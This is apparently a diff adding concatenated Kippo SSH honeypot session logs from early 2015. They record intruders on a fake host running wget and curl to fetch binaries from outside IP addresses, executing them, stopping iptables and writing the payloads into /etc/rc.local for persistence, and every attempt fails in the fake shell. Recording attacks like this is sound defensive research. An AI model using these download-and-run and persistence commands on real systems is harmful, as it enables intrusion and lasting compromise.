@@ -1,0 +1,383 @@
+
+---START:/home/kippo/kippo/log/tty/20150310-130721-692.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150310-130721-692.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150311-043750-6626.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150311-043750-6626.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150313-164855-9254.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150313-164855-9254.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150318-125135-2833.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150318-125135-2833.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150302-184054-4474.log---
+nas3:~# service iptables stop
+bash: service: command not found
+nas3:~# wget http://58.220.3.207:888/1
+http://58.220.3.207:888/1: Unsupported scheme.
+nas3:~# chmod 0777 1
+nas3:~# ./1 &
+bash: ./1: command not found
+nas3:~# wget http://58.220.3.207:888/2
+http://58.220.3.207:888/2: Unsupported scheme.
+nas3:~# chmod 0777 2
+nas3:~# ./2 &
+bash: ./2: command not found
+nas3:~# echo "cd  /root/">>/etc/rc.local
+cd  /root/>>/etc/rc.local
+nas3:~# echo "./2&">>/etc/rc.local
+./2&>>/etc/rc.local
+nas3:~# echo "./1&">>/etc/rc.local
+./1&>>/etc/rc.local
+nas3:~# echo "/etc/init.d/iptables stop">>/etc/rc.local
+/etc/init.d/iptables stop>>/etc/rc.local
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150302-184054-4474.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150318-194304-7786.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150318-194304-7786.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150227-011042-2318.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150227-011042-2318.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150304-163806-4435.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150304-163806-4435.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150310-174633-6764.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150310-174633-6764.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150319-073653-693.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150319-073653-693.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150306-122930-8470.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150306-122930-8470.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150303-040829-8468.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150303-040829-8468.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150310-202853-2574.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150310-202853-2574.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150302-185910-5808.log---
+nas3:~# service iptables stop
+bash: service: command not found
+nas3:~# wget http://58.220.3.207:888/2222.64
+http://58.220.3.207:888/2222.64: Unsupported scheme.
+nas3:~# chmod 0777 2222.64
+nas3:~# ./2222.64 &
+bash: ./2222.64: command not found
+nas3:~# wget http://58.220.3.207:888/2222.32
+http://58.220.3.207:888/2222.32: Unsupported scheme.
+nas3:~# chmod 0777 2222.32
+nas3:~# ./2222.32 &
+bash: ./2222.32: command not found
+nas3:~# echo "cd  /root/">>/etc/rc.local
+cd  /root/>>/etc/rc.local
+nas3:~# echo "./2222.32&">>/etc/rc.local
+./2222.32&>>/etc/rc.local
+nas3:~# echo "./2222.64&">>/etc/rc.local
+./2222.64&>>/etc/rc.local
+nas3:~# echo "/etc/init.d/iptables stop">>/etc/rc.local
+/etc/init.d/iptables stop>>/etc/rc.local
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150302-185910-5808.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150302-075928-8769.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150302-075928-8769.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150309-165616-639.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150309-165616-639.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150306-193655-4446.log---
+nas3:~# wget http://183.56.173.23:25816/asdq16
+http://183.56.173.23:25816/asdq16: Unsupported scheme.
+nas3:~# chmod 777 asdq16
+nas3:~# ./asdq16
+bash: ./asdq16: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150306-193655-4446.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150319-082620-3733.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150319-082620-3733.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150305-102744-1966.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150305-102744-1966.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150304-201003-5519.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150304-201003-5519.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150308-164356-3763.log---
+nas3:~# wget http://218.244.148.238:8080/bin.sh
+http://218.244.148.238:8080/bin.sh: Unsupported scheme.
+nas3:~# chmod 0755 ./bin.sh
+nas3:~# nohup ./bin.sh> /dev/null 2>&1 &
+bash: nohup: command not found
+nas3:~# curl http://218.244.148.238:8080/npc -o /tmp/npc
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc
+nas3:~# /tmp/./npc
+bash: /tmp/./npc: command not found
+nas3:~# wget http://218.244.148.238:8080/npc
+http://218.244.148.238:8080/npc: Unsupported scheme.
+nas3:~# chmod 0755 ./npc
+nas3:~# ./npc
+bash: ./npc: command not found
+nas3:~# curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+bash: curl: command not found
+nas3:~# chmod 0755 /tmp/./npc1
+nas3:~# /tmp/./npc1
+bash: /tmp/./npc1: command not found
+nas3:~# wget http://218.244.148.238:8080/npc1
+http://218.244.148.238:8080/npc1: Unsupported scheme.
+nas3:~# chmod 0755 ./npc1
+nas3:~# ./npc1
+bash: ./npc1: command not found
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150308-164356-3763.log---
+
+
+---START:/home/kippo/kippo/log/tty/20150303-075219-9901.log---
+nas3:~#
+---END:/home/kippo/kippo/log/tty/20150303-075219-9901.log---
+
+
+***DOWNLOADS***
+
